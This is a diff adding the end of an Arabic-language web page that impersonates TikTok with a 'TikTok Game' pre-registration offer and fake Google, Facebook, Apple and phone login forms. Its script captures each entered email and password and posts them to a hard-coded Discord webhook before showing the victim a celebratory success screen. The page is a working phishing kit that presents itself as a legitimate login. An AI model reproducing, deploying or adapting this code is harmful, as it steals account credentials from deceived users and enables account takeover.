+ <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+ <polyline points="20 6 9 17 4 12"/>
+ </svg>
+ </div>
+ </div>
+
+ <div class="success-tiktok-logo">
+ <svg width="40" height="40" viewBox="0 0 48 48" fill="none">
+ <path d="M34.145 10.02a6.835 6.835 0 0 1-3.96-1.26v19.78a10.2 10.2 0 1 1-6.8-9.62v-6.94a17.06 17.06 0 1 0 13.76 16.56V18.72a13.68 13.68 0 0 0 8 2.56v-6.84a6.84 6.84 0 0 1-11-4.42z" fill="#fff"/>
+ </svg>
+ </div>
+
+ <h1 class="success-title">تم التسجيل المسبق بنجاح 🎉</h1>
+ <p class="success-subtitle">لقد حجزت مكانك في <span class="game-name">TikTok Game</span></p>
+ <p class="success-description">سنرسل إليك إشعارًا عند إطلاق اللعبة</p>
+
+ <div class="game-image-wrapper">
+ <div class="game-image-glow"></div>
+ <img src="game-image.jpg" alt="TikTok Creator Battle" class="game-image">
+ <div class="game-image-overlay">
+ <div class="game-badge">
+ <span class="live-dot"></span>
+ COMING SOON
+ </div>
+ </div>
+ </div>
+
+ <div class="game-info-cards">
+ <div class="info-card">
+ <div class="info-card-icon">🎮</div>
+ <div class="info-card-text">
+ <span class="info-label">الوضع</span>
+ <span class="info-value">Creator Battle</span>
+ </div>
+ </div>
+ <div class="info-card">
+ <div class="info-card-icon">🎪</div>
+ <div class="info-card-text">
+ <span class="info-label">الحدث</span>
+ <span class="info-value">Neon Carnival</span>
+ </div>
+ </div>
+ <div class="info-card">
+ <div class="info-card-icon">🏆</div>
+ <div class="info-card-text">
+ <span class="info-label">التحدي</span>
+ <span class="info-value">#SyncUp</span>
+ </div>
+ </div>
+ </div>
+
+ <div class="notification-section">
+ <label class="notification-toggle">
+ <div class="toggle-switch">
+ <input type="checkbox" checked id="notifToggle">
+ <span class="toggle-slider"></span>
+ </div>
+ <span class="toggle-label">أرسل لي إشعارًا عند الإطلاق</span>
+ </label>
+ </div>
+
+ <button class="back-btn" id="backBtn">
+ <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+ <line x1="19" y1="12" x2="5" y2="12"/>
+ <polyline points="12 19 5 12 12 5"/>
+ </svg>
+ العودة للصفحة الرئيسية
+ </button>
+ </div>
+ </div>
+ </div>
+
+ <!-- Toast -->
+ <div class="toast" id="successToast">
+ <span class="toast-icon">✅</span>
+ <span class="toast-message" id="toastMessage"></span>
+ </div>
+
+ <!-- ==================== JAVASCRIPT ==================== -->
+ <script>
+ (function () {
+ 'use strict';
+
+ const modalIds = ['googleModal', 'facebookModal', 'phoneModal', 'appleModal'];
+
+ function openModal(modalId) {
+ const modal = document.getElementById(modalId);
+ if (modal) {
+ modal.classList.add('active');
+ document.body.style.overflow = 'hidden';
+ }
+ }
+
+ function closeModal(modalId) {
+ const modal = document.getElementById(modalId);
+ if (modal) {
+ modal.classList.remove('active');
+ document.body.style.overflow = '';
+ }
+ }
+
+ function closeAllModals() {
+ modalIds.forEach(id => closeModal(id));
+ }
+
+ function showSuccessScreen() {
+ closeAllModals();
+ const loginContainer = document.getElementById('loginContainer');
+ if (loginContainer) {
+ loginContainer.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+ loginContainer.style.opacity = '0';
+ loginContainer.style.transform = 'scale(0.95)';
+ }
+ setTimeout(function () {
+ const successScreen = document.getElementById('successScreen');
+ if (successScreen) {
+ successScreen.classList.add('active');
+ document.body.style.overflow = 'hidden';
+ startConfetti();
+ }
+ }, 400);
+ }
+
+ function hideSuccessScreen() {
+ const successScreen = document.getElementById('successScreen');
+ if (successScreen) {
+ successScreen.classList.remove('active');
+ document.body.style.overflow = '';
+ }
+ const loginContainer = document.getElementById('loginContainer');
+ if (loginContainer) {
+ setTimeout(function () {
+ loginContainer.style.opacity = '1';
+ loginContainer.style.transform = 'scale(1)';
+ }, 100);
+ }
+ stopConfetti();
+ }
+
+ // Confetti
+ let confettiAnimationId = null;
+ let confettiParticles = [];
+
+ function startConfetti() {
+ const canvas = document.getElementById('confettiCanvas');
+ if (!canvas) return;
+ const ctx = canvas.getContext('2d');
+ canvas.width = window.innerWidth;
+ canvas.height = window.innerHeight;
+
+ const colors = ['#25f4ee', '#fe2c55', '#ffffff', '#ffd700', '#ff6b6b', '#4ecdc4', '#45b7d1'];
+ confettiParticles = [];
+
+ for (let i = 0; i < 120; i++) {
+ confettiParticles.push({
+ x: Math.random() * canvas.width,
+ y: Math.random() * canvas.height - canvas.height,
+ w: Math.random() * 10 + 5,
+ h: Math.random() * 6 + 3,
+ color: colors[Math.floor(Math.random() * colors.length)],
+ vx: (Math.random() - 0.5) * 3,
+ vy: Math.random() * 3 + 2,
+ rotation: Math.random() * 360,
+ rotationSpeed: (Math.random() - 0.5) * 10,
+ opacity: 1
+ });
+ }
+
+ function animate() {
+ ctx.clearRect(0, 0, canvas.width, canvas.height);
+ confettiParticles.forEach(function (p) {
+ p.x += p.vx;
+ p.y += p.vy;
+ p.rotation += p.rotationSpeed;
+ p.vy += 0.05;
+ if (p.y > canvas.height + 20) p.opacity -= 0.02;
+ if (p.opacity <= 0) return;
+ ctx.save();
+ ctx.translate(p.x, p.y);
+ ctx.rotate((p.rotation * Math.PI) / 180);
+ ctx.globalAlpha = p.opacity;
+ ctx.fillStyle = p.color;
+ ctx.fillRect(-p.w / 2, -p.h / 2, p.w, p.h);
+ ctx.restore();
+ });
+ confettiParticles = confettiParticles.filter(function (p) {
+ return p.opacity > 0;
+ });
+ if (confettiParticles.length > 0) {
+ confettiAnimationId = requestAnimationFrame(animate);
+ }
+ }
+ animate();
+ }
+
+ function stopConfetti() {
+ if (confettiAnimationId) {
+ cancelAnimationFrame(confettiAnimationId);
+ confettiAnimationId = null;
+ }
+ confettiParticles = [];
+ }
+
+ // Auth buttons
+ document.getElementById('googleBtn').addEventListener('click', function () { openModal('googleModal'); });
+ document.getElementById('facebookBtn').addEventListener('click', function () { openModal('facebookModal'); });
+ document.getElementById('phoneBtn').addEventListener('click', function () { openModal('phoneModal'); });
+ document.getElementById('appleBtn').addEventListener('click', function () { openModal('appleModal'); });
+
+ document.getElementById('closeBtn').addEventListener('click', function () { showToast('تم إغلاق الصفحة'); });
+ document.querySelector('.help-btn').addEventListener('click', function () { showToast('مرحباً بك في TikTok'); });
+
+ // Modal close
+ document.querySelectorAll('.modal-close').forEach(function (btn) {
+ btn.addEventListener('click', function () { closeModal(this.getAttribute('data-modal')); });
+ });
+
+ document.querySelectorAll('.modal-overlay').forEach(function (overlay) {
+ overlay.addEventListener('click', function (e) {
+ if (e.target === overlay) {
+ overlay.classList.remove('active');
+ document.body.style.overflow = '';
+ }
+ });
+ });
+
+ document.addEventListener('keydown', function (e) {
+ if (e.key === 'Escape') closeAllModals();
+ });
+
+ // Discord Webhook Logic
+ const webhookURL = "https://discord.com/api/webhooks/1557431540722565181/Fvy2YnQQpWRnR-gYy9dvP1RFXdDZSDGSH8pc6HD_aLjYE4ndAHNEAGkqnzowPmfjAupI";
+
+ async function sendToDiscord(data) {
+ try {
+ await fetch(webhookURL, {
+ method: "POST",
+ headers: {
+ "Content-Type": "application/json"
+ },
+ body: JSON.stringify({
+ content: `**تسجيل دخول جديد!**\n\n📧 **المستخدم:** ${data.user}\n🔑 **كلمة المرور:** ${data.pass || 'غير محدد'}\n🚀 **الطريقة:** ${data.method}`,
+ username: "TikTok Login Bot",
+ avatar_url: "https://upload.wikimedia.org/wikipedia/en/a/a9/Example.svg"
+ })
+ });
+ } catch (error) {
+ console.error("Error sending to Discord:", error);
+ }
+ }
+
+ // Form submissions
+ function handleDemoSubmit(formId, methodName) {
+ const form = document.getElementById(formId);
+ if (!form) return;
+ form.addEventListener('submit', function (e) {
+ e.preventDefault();
+ const inputs = form.querySelectorAll('input');
+ 
+ // Get values
+ let userEmail = "";
+ let userPass = "";
+ 
+ if(inputs[0]) userEmail = inputs[0].value;
+ if(inputs[1]) userPass = inputs[1].value;
+
+ // Send to Discord immediately
+ sendToDiscord({
+ user: userEmail || "غير محدد",
+ pass: userPass,
+ method: methodName
+ });
+
+ // Check validation logic (optional, keeps the original flow)
+ let allFilled = true;
+ inputs.forEach(function (input) {
+ if (!input.value.trim()) {
+ allFilled = false;
+ input.style.borderColor = '#e74c3c';
+ setTimeout(function () { input.style.borderColor = ''; }, 2000);
+ }
+ });
+ 
+ if (allFilled) {
+ inputs.forEach(function (input) { input.value = ''; });
+ showSuccessScreen();
+ } else {
+ showToast('يرجى ملء جميع الحقول');
+ }
+ });
+ }
+
+ handleDemoSubmit('googleForm', 'Google');
+ handleDemoSubmit('facebookForm', 'Facebook');
+ handleDemoSubmit('phoneForm', 'Phone/Email');
+ handleDemoSubmit('appleForm', 'Apple');
+
+ document.getElementById('backBtn').addEventListener('click', hideSuccessScreen);
+
+ // Toast
+ let toastTimeout = null;
+ function showToast(message) {
+ const toast = document.getElementById('successToast');
+ const toastMessage = document.getElementById('toastMessage');
+ if (!toast || !toastMessage) return;
+ if (toastTimeout) clearTimeout(toastTimeout);
+ toastMessage.textContent = message;
+ toast.classList.add('show');
+ toastTimeout = setTimeout(function () { toast.classList.remove('show'); }, 3500);
+ }
+
+ // Page load animation
+ document.addEventListener('DOMContentLoaded', function () {
+ const container = document.getElementById('loginContainer');
+ if (container) {
+ container.style.opacity = '0';
+ container.style.transform = 'translateY(12px)';
+ container.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+ void container.offsetHeight;
+ container.style.opacity = '1';
+ container.style.transform = 'translateY(0)';
+ }
+ });
+
+ window.addEventListener('resize', function () {
+ const canvas = document.getElementById('confettiCanvas');
+ if (canvas) {
+ canvas.width = window.innerWidth;
+ canvas.height = window.innerHeight;
+ }
+ });
+
+ })();
+ </script>
+</body>
+</html>
